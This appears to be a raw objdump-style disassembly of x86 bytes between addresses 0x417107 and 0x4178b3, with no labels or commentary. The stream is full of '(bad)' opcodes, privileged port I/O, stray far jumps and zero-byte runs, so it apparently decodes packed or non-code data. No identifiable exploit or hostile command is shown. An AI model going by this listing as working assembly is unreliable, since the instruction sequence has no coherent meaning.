  417107:	add    al,0xe
  417109:	nop
  41710a:	imul   eax,DWORD PTR [ebx+0xd],0x5b
  41710e:	in     eax,dx
  41710f:	cmp    BYTE PTR [edx],cl
  417111:	fcomp  DWORD PTR [eax+ebp*8]
  417114:	pop    ss
  417115:	cmp    eax,DWORD PTR [edx]
  417117:	add    dh,ch
  417119:	pop    edx
  41711a:	ja     0x41718f
  41711c:	in     eax,0xe5
  41711e:	push   0xd
  417120:	icebp  
  417121:	fild   DWORD PTR [edx]
  417123:	add    BYTE PTR [eax],al
  417125:	add    BYTE PTR [eax],al
  417127:	add    BYTE PTR [eax],al
  417129:	jne    0x417123
  41712b:	inc    ebx
  41712c:	aaa    
  41712d:	ss add ebx,edx
  417130:	inc    ecx
  417131:	add    BYTE PTR [edi+0x11],dl
  417134:	mov    bh,BYTE PTR [edi-0x15]
  417137:	pop    edx
  417138:	es dec eax
  41713a:	inc    di
  41713c:	add    ch,BYTE PTR [edi+0x40]
  41713f:	or     al,0x80
  417141:	lods   al,BYTE PTR ds:[esi]
  417142:	call   esi
  417144:	add    BYTE PTR [ebx+0x5e402168],dh
  41714a:	sub    BYTE PTR [edx+esi*2],ch
  41714d:	xchg   esi,eax
  41714e:	jg     0x417175
  417150:	or     DWORD PTR [esi],0xf00d014b
  417156:	or     eax,DWORD PTR [ebx]
  417158:	add    BYTE PTR [ebp-0xf],dh
  41715b:	sti    
  41715c:	mov    bh,al
  41715e:	ret    0xe7bb
  417161:	sub    eax,0xfe00041c
  417166:	add    ch,BYTE PTR [esi]
  417168:	mov    ah,0xcc
  41716a:	or     DWORD PTR [edi-0x180d1795],edi
  417170:	add    edi,edx
  417172:	lds    edx,FWORD PTR [esi-0x79]
  417175:	into   
  417176:	push   edx
  417177:	out    0x12,eax
  417179:	stc    
  41717a:	(bad)  
  41717b:	out    0x3,eax
  41717d:	jne    0x4171fe
  41717f:	int3   
  417180:	imul   esi,DWORD PTR [ebp-0x64],0x27
  417184:	cmp    dh,BYTE PTR [edx+eax*1-0x5799d43]
  41718b:	clc    
  41718c:	ret    
  41718d:	add    BYTE PTR [eax],al
  41718f:	add    BYTE PTR [eax],al
  417191:	add    BYTE PTR [edx],bl
  417193:	out    0x47,al
  417195:	mov    al,ds:0xe9e6c02b
  41719a:	test   DWORD PTR [edx+0x7b],0x330dedc4
  4171a1:	cmp    dh,BYTE PTR [edx+eax*1+0x13694d6c]
  4171a8:	ficomp WORD PTR [edx-0x5314e4b]
  4171ae:	jb     0x4171b1
  4171b0:	out    0x88,eax
  4171b2:	mov    ch,0xd6
  4171b4:	add    BYTE PTR [ebx],dl
  4171b6:	or     dh,dh
  4171b8:	mov    bh,BYTE PTR [ecx]
  4171ba:	xor    al,0x2
  4171bc:	cli    
  4171bd:	dec    esp
  4171be:	cli    
  4171bf:	(bad)
  4171c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171c3:	(bad)  
  4171c4:	shr    cl,1
  4171c6:	cmc    
  4171c7:	push   ds
  4171c8:	pop    ds
  4171c9:	and    al,0x24
  4171cb:	add    edx,DWORD PTR [ecx]
  4171cd:	and    al,0x3f
  4171cf:	in     al,0x6f
  4171d1:	div    DWORD PTR [edx]
  4171d3:	or     ebx,DWORD PTR [esi-0x8]
  4171d6:	into   
  4171d7:	xor    al,0x2a
  4171d9:	add    al,0x4a
  4171db:	pop    ss
  4171dc:	mov    cl,0xd5
  4171de:	cwde   
  4171df:	mov    ah,0x7d
  4171e1:	clc    
  4171e2:	pop    esi
  4171e3:	lock jmp FWORD PTR [eax]
  4171e6:	jns    0x417245
  4171e8:	jno    0x4171cb
  4171ea:	sti    
  4171eb:	ror    BYTE PTR [ebx],0xd3
  4171ee:	jbe    0x41725a
  4171f0:	sub    al,0xef
  4171f2:	jno    0x4171f6
  4171f4:	mov    DWORD PTR [ecx+0x0],edx
  4171f7:	add    BYTE PTR [eax],al
  4171f9:	add    BYTE PTR [eax],al
  4171fb:	std    
  4171fc:	pop    esp
  4171fd:	or     eax,0x1e265
  417202:	jmp    0x979f8957
  417207:	in     eax,0x7e
  417209:	loopne 0x417242
  41720b:	xchg   edi,eax
  41720c:	pop    ebp
  41720d:	push   0xffffffe9
  41720f:	out    0x5d,al
  417211:	adc    edi,DWORD PTR [ecx+0x6a001b1c]
  417217:	mov    dl,0xe
  417219:	mov    ebp,DWORD PTR [esi+edx*4+0x5c]
  41721d:	std    
  41721e:	push   cs
  41721f:	(bad)  
  417220:	call   0x76c7824
  417225:	xchg   DWORD PTR [esi+edx*4],esi
  417228:	pop    esp
  417229:	std    
  41722a:	not    BYTE PTR [ecx+edx*8+0x7]
  41722e:	out    dx,al
  41722f:	loop   0x4171c7
  417231:	adc    ebp,DWORD PTR [ecx]
  417233:	jns    0x4171b6
  417235:	clc    
  417236:	call   0xffab44fe
  41723b:	add    ecx,DWORD PTR [edi+0x5d54cc4c]
  417241:	pop    eax
  417242:	rol    ecx,1
  417244:	lods   al,BYTE PTR ds:[esi]
  417245:	add    cl,ch
  417247:	enter  0x8af3,0x7c
  41724b:	jne    0x4172aa
  41724d:	std    
  41724e:	scas   al,BYTE PTR es:[edi]
  41724f:	jmp    0x79987cb6
  417254:	add    al,BYTE PTR [ecx-0x76fddae4]
  41725a:	cmp    al,0x21
  41725c:	mov    DWORD PTR [ecx-0x7],ecx
  41725f:	add    BYTE PTR [eax],al
  417261:	add    BYTE PTR [eax],al
  417263:	add    dh,ch
  417265:	mov    ecx,0x64c0073
  41726a:	xchg   eax,esi
  41726c:	mov    eax,DWORD PTR [ebx+0x72]
  41726f:	in     al,dx
  417270:	loope  0x417282
  417272:	or     eax,DWORD PTR [esp+ecx*1-0x7e]
  417276:	lds    esi,FWORD PTR [ebp+0x51]
  417279:	jge    0x417243
  41727b:	jbe    0x417289
  41727d:	push   es
  41727e:	test   BYTE PTR [ebp-0x5c],0x5
  417282:	je     0x41728a
  417284:	test   eax,0xbbff1c81
  417289:	jecxz  0x417285
  41728b:	jne    0x417309
  41728d:	pushf  
  41728e:	dec    edi
  41728f:	push   ecx
  417290:	or     al,0x9b
  417292:	mov    al,BYTE PTR [ebp-0x546f8]
  417298:	fsub   st(6),st
  41729a:	mov    edi,0xfdd2b983
  41729f:	jmp    FWORD PTR [ebx+0xa]
  4172a2:	push   0x0
  4172a4:	sub    edx,edx
  4172a6:	mov    edi,0x6be8f57
  4172ab:	push   eax
  4172ac:	fs push 0x7edc019e
  4172b2:	les    ebp,FWORD PTR [eax]
  4172b4:	push   esp
  4172b5:	inc    ecx
  4172b6:	or     BYTE PTR [edi-0x3c],dl
  4172b9:	xchg   edi,eax
  4172ba:	and    al,0x1
  4172bc:	int3   
  4172bd:	loop   0x41732f
  4172bf:	call   0x1660278
  4172c4:	fsubr  st(2),st
  4172c6:	jo     0x4172b8
  4172c8:	add    BYTE PTR [eax],al
  4172ca:	add    BYTE PTR [eax],al
  4172cc:	add    BYTE PTR [edi+eax*2-0x7a33fedc],ah
  4172d3:	jns    0x4172e0
  4172d5:	pushf  
  4172d6:	xor    BYTE PTR [ecx],al
  4172d8:	xor    DWORD PTR [ecx],0xffffffb6
  4172db:	repnz inc DWORD PTR [ecx-0x4cc7182e]
  4172e2:	add    al,0x0
  4172e4:	div    BYTE PTR [ebp+0x26]
  4172e7:	pop    esp
  4172e8:	inc    DWORD PTR [ecx]
  4172ea:	cmp    dh,BYTE PTR [edi+eiz*8-0x2a02227]
  4172f1:	icebp  
  4172f2:	stos   DWORD PTR es:[edi],eax
  4172f3:	aad    0x3
  4172f5:	neg    BYTE PTR ds:0x1e63025c
  4172fb:	pop    esp
  4172fc:	adc    cl,ch
  4172fe:	inc    BYTE PTR [edx-0x29956687]
  417304:	push   es
  417305:	(bad)  
  417306:	stos   DWORD PTR es:[edi],eax
  417307:	sbb    DWORD PTR [ecx+0x73015fcd],eax
  41730d:	jae    0x41738b
  41730f:	imul   ebx,DWORD PTR [esi],0x84601842
  417315:	xor    eax,0xb8810597
  41731a:	adc    eax,DWORD PTR ds:0x8c23a8fd
  417320:	icebp  
  417321:	or     eax,0x12ff80c3
  417326:	in     al,0xc5
  417328:	imul   DWORD PTR [edx+0x37c6bca9]
  41732e:	add    DWORD PTR [bp+di+0x0],edx
  417332:	add    BYTE PTR [eax],al
  417334:	add    BYTE PTR [eax],al
  417336:	out    dx,al
  417337:	push   es
  417338:	mov    WORD PTR [ebx-0x73],es
  41733b:	in     al,dx
  41733c:	ins    BYTE PTR es:[edi],dx
  41733d:	adc    al,0x46
  41733f:	jno    0x4172cd
  417341:	xor    dh,ch
  417343:	and    eax,0x10758900
  417348:	(bad)  
  417349:	jl     0x4173c6
  41734b:	xor    BYTE PTR [ebx+0x26],ch
  41734e:	je     0x4173bb
  417350:	add    DWORD PTR [eax-0x7cf2f97d],eax
  417356:	pop    ecx
  417357:	push   0x1
  417359:	add    bh,bh
  41735b:	clc    
  41735c:	add    al,BYTE PTR [eax-0x7df1a551]
  417362:	test   DWORD PTR [edx],eax
  417364:	call   0xa1c3e86c
  417369:	sbb    eax,0x4ee8180
  41736e:	jne    0x417372
  417370:	(bad)  
  417372:	push   0xffffff8d
  417374:	lock adc bl,BYTE PTR [esi+eax*4+0x5c5f25]
  41737c:	addr16 sbb al,0x96
  41737f:	int    0xe4
  417381:	ret    0x1bba
  417384:	das    
  417385:	(bad)  
  417386:	addr16 push ecx
  417388:	sub    al,BYTE PTR ds:0x44e7d80
  41738e:	jne    0x417392
  417390:	addr16 pop edx
  417392:	test   ebp,ecx
  417394:	jmp    0x91:0x46c3512
  41739b:	add    BYTE PTR [eax],al
  41739d:	add    BYTE PTR [eax],al
  41739f:	mov    dh,0x56
  4173a1:	xchg   edi,eax
  4173a2:	pop    esi
  4173a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173a4:	or     bl,BYTE PTR [edi-0x47]
  4173a7:	push   ds
  4173a8:	inc    ecx
  4173a9:	lods   al,BYTE PTR ds:[esi]
  4173aa:	pusha  
  4173ab:	jne    0x417417
  4173ad:	cmc    
  4173ae:	add    DWORD PTR [edx],edx
  4173b0:	pop    eax
  4173b1:	push   0x5c
  4173b3:	or     cl,BYTE PTR [ecx]
  4173b5:	pop    ebx
  4173b6:	inc    edx
  4173b7:	jne    0x4173bb
  4173b9:	out    0x1a,eax
  4173bb:	mov    dh,0xf2
  4173bd:	in     eax,dx
  4173be:	sub    BYTE PTR [edx],0x3
  4173c1:	out    0x3,eax
  4173c3:	cld    
  4173c4:	(bad)
  4173c7:	jns    0x41740a
  4173c9:	jb     0x4173d6
  4173cb:	in     al,dx
  4173cc:	(bad)  
  4173ce:	sub    cl,dl
  4173d0:	add    esp,DWORD PTR [eax+edi*8]
  4173d3:	and    DWORD PTR [ecx+0x19b9fbe],esi
  4173d9:	out    0x8c,eax
  4173db:	ss pop edx
  4173dd:	fs pop esi
  4173df:	sub    DWORD PTR [edx],ecx
  4173e1:	add    BYTE PTR [esi+esi*1+0x5],ch
  4173e5:	test   BYTE PTR [esi+esi*2-0x11c1fffe],al
  4173ec:	cmp    ch,al
  4173ee:	and    al,0x16
  4173f0:	push   ebp
  4173f1:	std    
  4173f2:	(bad)  
  4173f3:	int    0xfb
  4173f5:	mov    bl,bh
  4173f7:	out    dx,eax
  4173f8:	cmp    cl,BYTE PTR [ecx+0x89752c]
  4173fe:	ins    BYTE PTR es:[edi],dx
  4173ff:	push   edx
  417400:	out    dx,eax
  417401:	std    
  417402:	bound  eax,QWORD PTR [eax]
  417404:	add    BYTE PTR [eax],al
  417406:	add    BYTE PTR [eax],al
  417408:	cmp    eax,0xefe988ef
  41740d:	dec    ecx
  41740e:	sub    DWORD PTR [edi],esi
  417410:	add    eax,0x9f5f0ec6
  417415:	push   edx
  417416:	xchg   DWORD PTR [edx+eiz*4-0x10a68c81],esp
  41741d:	rcl    BYTE PTR [edi],cl
  41741f:	je     0x41744c
  417421:	pop    eax
  417422:	in     eax,0xa4
  417424:	pop    ebp
  417425:	push   edi
  417426:	std    
  417427:	ins    DWORD PTR es:[edi],dx
  417428:	mov    dh,0xce
  41742a:	push   0x62
  41742c:	mov    eax,0x3dea3089
  417431:	and    DWORD PTR [bp+si],0x1611d174
  417438:	sub    eax,0x74a78b53
  41743d:	mov    dl,0x8a
  41743f:	in     eax,dx
  417440:	addr16 mov dl,0xe7
  417443:	retf   0x5798
  417446:	std    
  417447:	add    ah,cl
  417449:	int3   
  41744a:	or     al,0x62
  41744c:	lds    edx,FWORD PTR [edx-0x75]
  41744f:	das    
  417450:	ja     0x417404
  417452:	mov    dh,ch
  417454:	gs push 0x25
  417457:	pcmpeqd mm0,QWORD PTR [edx]
  41745a:	push   ecx
  41745b:	into   
  41745c:	stos   BYTE PTR es:[edi],al
  41745d:	dec    esi
  41745e:	push   esi
  41745f:	add    BYTE PTR [ebx+0x5c16494e],dh
  417465:	(bad)  
  417466:	jle    0x41742c
  417468:	nop
  417469:	mov    ch,0x70
  41746b:	clc    
  41746c:	add    BYTE PTR [eax],al
  41746e:	add    BYTE PTR [eax],al
  417470:	add    BYTE PTR [edi+esi*2-0x7673fedf],dh
  417477:	inc    ecx
  417478:	sbb    al,0x5
  41747a:	test   BYTE PTR [esi+0x898445],0x8d
  417481:	push   0x708dfc58
  417486:	idiv   dl
  417488:	inc    esi
  417489:	aaa    
  41748a:	scas   eax,DWORD PTR es:[edi]
  41748b:	or     al,BYTE PTR [edx-0x54af2]
  417491:	pushf  
  417492:	add    DWORD PTR [ebx+0x5e],ebx
  417495:	aaa    
  417496:	leave  
  417497:	rcr    DWORD PTR [eax],0x5c
  41749a:	hlt    
  41749b:	mov    edi,0x70b7a9eb
  4174a0:	clc    
  4174a1:	mov    ah,0x84
  4174a3:	and    DWORD PTR [ecx],eax
  4174a5:	dec    esp
  4174a6:	jmp    0x417499
  4174a8:	push   ebp
  4174a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174aa:	sar    BYTE PTR [esi-0x14],cl
  4174ad:	add    BYTE PTR [ebx-0x168f7bf],cl
  4174b3:	dec    esi
  4174b4:	push   esi
  4174b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174b6:	sub    eax,0x8f228b09
  4174bb:	add    al,cl
  4174bd:	hlt    
  4174be:	lds    esi,FWORD PTR [ebp+0x40]
  4174c1:	or     al,0x89
  4174c3:	dec    ecx
  4174c4:	clc    
  4174c5:	daa    
  4174c6:	retf   0x6a4c
  4174c9:	leave  
  4174ca:	call   0x6be8:0x1e345c3
  4174d1:	mov    edx,0x8b0000
  4174d6:	add    BYTE PTR [eax],al
  4174d8:	add    BYTE PTR [eax],al
  4174da:	mov    ah,0x7c
  4174dc:	xlat   BYTE PTR ds:[ebx]
  4174dd:	addps  xmm2,xmm4
  4174e0:	(bad)  
  4174e1:	push   DWORD PTR [ebp+0x6b]
  4174e4:	mov    BYTE PTR [ebx+0x71],bh
  4174e7:	jmp    0x4174c6
  4174e9:	cld    
  4174ea:	jne    0x417502
  4174ec:	sbb    al,0x6a
  4174ee:	push   ebp
  4174ef:	out    0xdd,al
  4174f1:	xlat   BYTE PTR ds:[ebx]
  4174f2:	dec    ebp
  4174f3:	inc    ebx
  4174f4:	mov    bh,0xa8
  4174f6:	jne    0x417563
  4174f8:	mov    es,WORD PTR [ebx-0x73]
  4174fb:	sbb    ebp,DWORD PTR [edi+ebx*1+0x2c]
  4174ff:	je     0x41755d
  417501:	test   BYTE PTR [ebp-0x35f30209],dh
  417507:	push   ds
  417508:	jo     0x41755a
  41750a:	out    dx,al
  41750b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41750c:	mov    cl,0x69
  41750e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41750f:	hlt    
  417510:	mov    WORD PTR [ebx+0x1d],?
  417513:	sub    DWORD PTR [ebp-0x77948bec],0x73
  41751a:	imul   edx,eax,0xdeac5758
  417520:	pop    ebx
  417521:	jge    0x41759a
  417523:	clc    
  417524:	pop    edx
  417525:	mov    DWORD PTR [eax-0x936d84d],esi
  41752b:	mov    cl,0xf5
  41752d:	dec    esi
  41752e:	add    BYTE PTR [eax+0x2c718af6],dl
  417534:	mov    dl,0x4f
  417536:	in     al,dx
  417537:	popf   
  417538:	push   ebp
  417539:	std    
  41753a:	or     BYTE PTR [ebx+0x3ff3],0x0
  417541:	add    BYTE PTR [eax],al
  417543:	jne    0x41752d
  417545:	inc    esp
  417546:	or     al,0xa2
  417548:	faddp  st(5),st
  41754a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41754b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41754c:	cwde   
  41754d:	pop    esp
  41754e:	adc    ebp,DWORD PTR [ecx-0x3ecb]
  417554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417555:	or     DWORD PTR [ecx-0x173c2184],ecx
  41755b:	je     0x4175ba
  41755d:	add    BYTE PTR [esi],cl
  41755f:	out    dx,al
  417560:	add    DWORD PTR [eax+edx*2],ebp
  417563:	hlt    
  417564:	cmp    eax,0xcbbeebeb
  417569:	es add al,0xfa
  41756c:	(bad)  
  41756d:	into   
  41756e:	das    
  41756f:	lods   eax,DWORD PTR ds:[esi]
  417570:	mov    dl,0x50
  417572:	icebp  
  417573:	dec    ebp
  417574:	cmp    al,0x24
  417576:	pop    ebx
  417577:	stos   BYTE PTR es:[edi],al
  417578:	pop    esp
  417579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41757a:	and    DWORD PTR [edx-0x9c39dac],esp
  417580:	cmp    dh,dh
  417582:	sbb    BYTE PTR [ebx],0x55
  417585:	sahf   
  417586:	pop    ebx
  417587:	(bad)  
  417588:	mov    esi,0xb920bb95
  41758d:	lahf   
  41758e:	inc    esi
  41758f:	ins    DWORD PTR es:[edi],dx
  417590:	add    bl,BYTE PTR [edi+ecx*4]
  417593:	popa   
  417594:	or     BYTE PTR [ebx+0x1dacc5f4],0x8f
  41759b:	gs jmp 0xb9810485
  4175a1:	outs   dx,DWORD PTR ds:[esi]
  4175a2:	rol    DWORD PTR [esi-0x78],1
  4175a5:	sub    BYTE PTR [edi],bl
  4175a7:	add    BYTE PTR [eax],al
  4175a9:	add    BYTE PTR [eax],al
  4175ab:	add    BYTE PTR [edi-0x2f],al
  4175ae:	cmc    
  4175af:	mov    es,WORD PTR [ebp+0x63d65917]
  4175b5:	pop    ss
  4175b6:	mov    esp,0xc4eea84f
  4175bb:	mov    gs,WORD PTR [esi-0x627f330e]
  4175c1:	(bad)  
  4175c2:	mov    bl,0xf4
  4175c4:	push   ebx
  4175c5:	int    0x1a
  4175c7:	pop    es
  4175c8:	cmp    ebx,DWORD PTR [edx]
  4175ca:	mov    ah,0x4f
  4175cc:	test   BYTE PTR [ecx-0x27],ah
  4175cf:	inc    ebx
  4175d0:	sbb    dh,BYTE PTR [eax-0x18]
  4175d3:	add    esi,DWORD PTR [ebp+0x7f]
  4175d6:	sub    BYTE PTR [edx],al
  4175d8:	cld    
  4175d9:	push   esp
  4175da:	rcr    BYTE PTR [ebp-0x4d],cl
  4175dd:	mov    ebp,0x7b76f5ff
  4175e2:	dec    ebx
  4175e3:	stc    
  4175e4:	jmp    0x7e9f69c0
  4175e9:	lods   eax,DWORD PTR ds:[esi]
  4175ea:	sub    BYTE PTR [ecx-0x57184d8c],0x62
  4175f1:	push   ebx
  4175f2:	std    
  4175f3:	pusha  
  4175f4:	mov    ch,0x4b
  4175f6:	jmp    0xf82171e8
  4175fb:	jmp    0x22b5cbf5
  417600:	cli    
  417601:	xlat   BYTE PTR ds:[ebx]
  417602:	imul   ecx
  417604:	stos   BYTE PTR es:[edi],al
  417605:	add    ecx,DWORD PTR [ebx-0x754ddad4]
  41760b:	and    al,0x29
  41760d:	mov    dl,0xe7
  41760f:	dec    esi
  417610:	add    BYTE PTR [eax],al
  417612:	add    BYTE PTR [eax],al
  417614:	add    BYTE PTR [edx*2+0x4f9d62fd],bl
  41761b:	add    DWORD PTR [esi-0x37edbbe],0xffffffce
  417622:	add    cl,BYTE PTR ds:0xfd53806d
  417628:	jmp    0x74494518
  41762d:	xor    eax,0x356c504f
  417632:	dec    ebx
  417633:	push   eax
  417634:	push   esi
  417635:	sub    eax,DWORD PTR [ebx]
  417637:	std    
  417638:	aam    0x72
  41763a:	lods   al,BYTE PTR ds:[esi]
  41763b:	cld    
  41763c:	mov    esp,0x3c196ac6
  417641:	iret   
  417642:	push   ebp
  417643:	test   BYTE PTR [ecx],ch
  417645:	outs   dx,DWORD PTR ds:[esi]
  417646:	jle    0x417660
  417648:	call   0xa4ca78c3
  41764d:	ret    0x169
  417650:	jb     0x417677
  417652:	sti    
  417653:	gs push 0x1d
  417656:	add    ecx,DWORD PTR [eax]
  417658:	fdivrp st(5),st
  41765a:	fwait
  41765b:	add    BYTE PTR [eax],al
  41765d:	fdiv   st(6),st
  41765f:	addr16 in al,0x62
  417662:	aas    
  417663:	std    
  417664:	(bad)  
  417665:	popa   
  417666:	scas   eax,DWORD PTR es:[edi]
  417667:	out    0x7f,eax
  417669:	retf   
  41766a:	(bad)  
  41766b:	inc    DWORD PTR [edx+0x270b6d4]
  417671:	outs   dx,DWORD PTR ds:[esi]
  417672:	mov    esi,0x86dbc080
  417677:	in     eax,0x0
  417679:	add    BYTE PTR [eax],al
  41767b:	add    BYTE PTR [eax],al
  41767d:	add    ah,cl
  41767f:	(bad)  
  417680:	ss inc ebp
  417682:	test   al,0x9
  417684:	jg     0x417666
  417686:	pushf  
  417687:	(bad)  
  417688:	dec    DWORD PTR [edx+0x348a5267]
  41768e:	shl    BYTE PTR [esi+edi*2],cl
  417691:	add    al,0x9f
  417693:	clc    
  417694:	(bad)  
  417695:	jl     0x417677
  417697:	or     BYTE PTR [esp+ecx*8-0x75000174],al
  41769e:	shl    ebp,cl
  4176a0:	jns    0x4176c5
  4176a2:	pop    ebp
  4176a3:	push   es
  4176a4:	test   DWORD PTR [ebp+0x4c],eax
  4176a7:	sar    DWORD PTR [edi+0x70d00f],1
  4176ad:	add    BYTE PTR [ebx+ebp*4+0x35],cl
  4176b1:	jmp    FWORD PTR [edi]
  4176b3:	push   esi
  4176b4:	dec    ebp
  4176b5:	inc    DWORD PTR [ecx+0x4a]
  4176b8:	adc    eax,DWORD PTR [eax+0x4c]
  4176bb:	jg     0x4176c3
  4176bd:	add    edx,DWORD PTR [ecx]
  4176bf:	push   esi
  4176c0:	add    ah,0x28
  4176c3:	stos   DWORD PTR es:[edi],eax
  4176c4:	jo     0x4176ba
  4176c6:	imul   eax,DWORD PTR [ecx-0xb],0x50
  4176ca:	imul   esp,DWORD PTR [ecx+0x49],0x16
  4176ce:	int3   
  4176cf:	add    eax,0x7f204687
  4176d4:	inc    edi
  4176d5:	adc    al,0x27
  4176d7:	mov    esi,0x6775c47e
  4176dc:	mov    dl,0x88
  4176de:	scas   al,BYTE PTR es:[edi]
  4176df:	dec    ebx
  4176e0:	add    al,0xc8
  4176e2:	add    BYTE PTR [eax],al
  4176e4:	add    BYTE PTR [eax],al
  4176e6:	add    dh,bh
  4176e8:	popa   
  4176e9:	mov    WORD PTR [ebx-0x7b],?
  4176ec:	pop    esp
  4176ed:	aas    
  4176ee:	add    DWORD PTR [eax],edi
  4176f0:	dec    edi
  4176f1:	mov    dl,0x4f
  4176f3:	fidiv  DWORD PTR [esi]
  4176f5:	lds    edx,FWORD PTR ds:0xc4845b35
  4176fb:	jns    0x41772d
  4176fd:	aam    0xf
  4176ff:	int    0xc
  417701:	and    edi,edi
  417703:	mov    edx,0xfc0fd3e2
  417708:	(bad)  
  417709:	out    dx,eax
  41770a:	lds    esi,FWORD PTR [eax]
  41770c:	nop
  41770d:	add    ch,cl
  41770f:	inc    edx
  417710:	(bad)  
  417712:	div    DWORD PTR [ebp+0x16]
  417715:	pop    ds
  417716:	mov    DWORD PTR [ebx-0x2c],edi
  417719:	(bad)  
  41771a:	add    edi,esi
  41771c:	adc    al,0xf4
  41771e:	sub    BYTE PTR [ebp+0x10],bh
  417721:	add    ecx,eax
  417723:	and    al,0x83
  417725:	jne    0x417748
  417727:	je     0x417784
  417729:	mov    al,BYTE PTR [ebx+0x6d]
  41772c:	out    0x40,al
  41772e:	je     0x4176d2
  417730:	lock mov bl,al
  417733:	dec    ebp
  417734:	mov    fs,WORD PTR [ecx-0x3]
  417737:	push   edx
  417738:	sar    BYTE PTR [ebp-0x741d010d],cl
  41773e:	pop    ebx
  41773f:	pop    ebp
  417740:	in     al,0x3
  417742:	mov    eax,eax
  417744:	push   edi
  417745:	xchg   BYTE PTR [ebp+ebp*2+0x5a],cl
  417749:	imul   eax,DWORD PTR [ebp+0x0],0x0
  417750:	push   edi
  417751:	pop    edx
  417752:	add    DWORD PTR [ebp+esi*1+0x7388f68f],eax
  417759:	pop    esp
  41775a:	add    al,0x55
  41775c:	adc    al,BYTE PTR [edx]
  41775e:	pushf  
  41775f:	pop    ebx
  417760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417761:	push   ecx
  417762:	hlt    
  417763:	(bad)  
  417764:	push   0x3c04e6c2
  417769:	jge    0x417750
  41776b:	test   BYTE PTR [ecx+0x71ff2cfd],bh
  417771:	cld    
  417772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417773:	mov    bl,BYTE PTR [ecx+edx*2+0x61cd5b7c]
  41777a:	leave  
  41777b:	add    dh,BYTE PTR [ebp+0x7c]
  41777e:	sub    al,0x57
  417780:	sub    BYTE PTR [eax-0xa48b2bf],dh
  417786:	out    0xb0,al
  417788:	in     eax,dx
  417789:	pop    ebp
  41778a:	push   0x68
  41778c:	push   ebp
  41778d:	mov    ch,0x1c
  41778f:	adc    esi,DWORD PTR [ebp+0x7ad971b8]
  417795:	jnp    0x4177c3
  417797:	pusha  
  417798:	repnz (bad) 
  41779a:	mov    esi,0xf5ee381d
  41779f:	jge    0x417745
  4177a1:	add    ah,bh
  4177a3:	add    edi,edx
  4177a5:	mov    BYTE PTR [edx-0x1615ff75],0xd0
  4177ac:	pop    esi
  4177ad:	adc    al,0xa2
  4177af:	push   edi
  4177b0:	jecxz  0x4177ac
  4177b2:	jno    0x417762
  4177b4:	add    BYTE PTR [eax],al
  4177b6:	add    BYTE PTR [eax],al
  4177b8:	add    BYTE PTR [esi-0x24],ch
  4177bb:	fisubr WORD PTR [esi+0x577b9852]
  4177c1:	push   eax
  4177c2:	xchg   DWORD PTR [edi],esp
  4177c4:	pop    es
  4177c5:	icebp  
  4177c6:	outs   dx,DWORD PTR ds:[esi]
  4177c7:	call   0xdd90eccf
  4177cc:	or     ebp,esp
  4177ce:	mov    eax,0xb782e9da
  4177d3:	dec    esi
  4177d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d5:	sbb    DWORD PTR [eax+0x3e],edx
  4177d8:	xor    BYTE PTR ds:0xe86d0000,0x4f
  4177df:	std    
  4177e0:	jmp    0xc85540e4
  4177e5:	int    0x5f
  4177e7:	pop    ds
  4177e8:	mov    esp,0xf95e79b2
  4177ed:	jmp    0x51ac73b5
  4177f2:	or     BYTE PTR ds:0x29a6b,cl
  4177f8:	jmp    0xf1c279ec
  4177fd:	fdivr  st,st(6)
  4177ff:	sbb    DWORD PTR [ecx+0x79],0xb4220002
  417806:	dec    ebx
  417807:	or     eax,0x24366
  41780c:	jmp    0xe58b0d84
  417811:	inc    eax
  417812:	(bad)  
  417813:	adc    al,0x3d
  417815:	pushf  
  417816:	iret   
  417817:	fsubrp st(5),st
  417819:	jnp    0x4177b3
  41781b:	(bad)  
  41781c:	mov    esi,0x0
  417821:	add    BYTE PTR [ecx-0x17],bl
  417824:	(bad)  
  417825:	push   0x19
  417827:	pop    edx
  417828:	sub    DWORD PTR [eax-0x4f4b02aa],0x6adfbbf1
  417832:	push   ds
  417833:	add    BYTE PTR [esi+0x3b],dh
  417836:	test   BYTE PTR [ecx-0x6],0xc0
  41783a:	aaa    
  41783b:	stc    
  41783c:	jb     0x417871
  41783e:	retf   0x13d5
  417841:	fs aaa 
  417843:	add    eax,0x7c46f6fd
  417848:	jnp    0x4178ab
  41784a:	push   es
  41784b:	add    DWORD PTR [bx+di],esi
  41784e:	jbe    0x417852
  417850:	adc    DWORD PTR [ecx+0x71],0xe5622fce
  417857:	push   es
  417858:	mov    eax,DWORD PTR [eax]
  41785a:	loope  0x41781a
  41785c:	dec    esp
  41785d:	(bad)  
  41785e:	shl    DWORD PTR [edx-0x1d2600b4],1
  417864:	xchg   bl,cl
  417866:	in     al,dx
  417867:	mov    bh,0x70
  417869:	clc    
  41786a:	xchg   DWORD PTR [edx-0x7],eax
  41786d:	call   0x3c2236
  417872:	mov    bl,al
  417874:	jae    0x417879
  417876:	add    DWORD PTR [edx-0x1f],0xffffffff
  41787a:	imul   ebp,DWORD PTR [ebx+0x34c00b7],0x266fe800
  417884:	std    
  417885:	inc    DWORD PTR [eax]
  417887:	add    BYTE PTR [eax],al
  417889:	add    BYTE PTR [eax],al
  41788b:	push   edi
  41788c:	sub    al,BYTE PTR ds:0x411bdf8b
  417892:	cld    
  417893:	iret   
  417894:	or     bh,BYTE PTR [edi+0x7d]
  417897:	mov    al,ds:0x39830c4f
  41789c:	mov    ch,0xfa
  41789e:	call   FWORD PTR [edi]
  4178a0:	aaa    
  4178a1:	icebp  
  4178a2:	add    BYTE PTR [edx+0x0],ch
  4178a5:	sti    
  4178a6:	aaa    
  4178a7:	pop    ss
  4178a8:	lea    eax,[ecx]
  4178aa:	push   0xffffb6b5
  4178af:	in     al,0xc7
  4178b1:	add    al,BYTE PTR [ecx]
  4178b3:	mov    WORD PTR [ecx-0x28],?
